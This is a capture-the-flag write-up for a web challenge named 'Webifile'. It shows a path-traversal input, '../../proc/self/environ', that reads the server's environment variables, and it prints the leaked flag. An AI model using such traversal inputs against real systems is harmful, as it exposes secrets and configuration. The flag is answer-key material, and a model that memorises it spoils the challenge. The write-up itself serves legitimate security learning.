# Webifile

## Description

Find the flag.

It's documented!

Author: [F4R3S](https://instagram.com/fares_almahsery)

## Solution Walkthrough

Notice that you can upload files and add a file to a document. The document reads the file, so I tried various attempts like sql injection or path traversal but they all failed.

```json
{
  "message": "[Errno 2] No such file or directory: '/tmp/app/../../flag.txt'"
}
```

Later, I decided to read environment variables and successfully obtained the flag.

```text
../../proc/self/environ
```

```json
{
  "content": "HOSTNAME=94aaa7655377\u0000PWD=/usr/src/app\u0000PORT=8862\u0000HOME=/home/appuser\u0000FLAG=0xV01D{04bce341-d41b-4a74-8861-7d28e6116ba3}\u0000SHLVL=1\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000_=/usr/local/bin/gunicorn\u0000",
  "success": true,
  "title": "sv"
}
```

## Flag

```text
0xV01D{04bce341-d41b-4a74-8861-7d28e6116ba3}
```
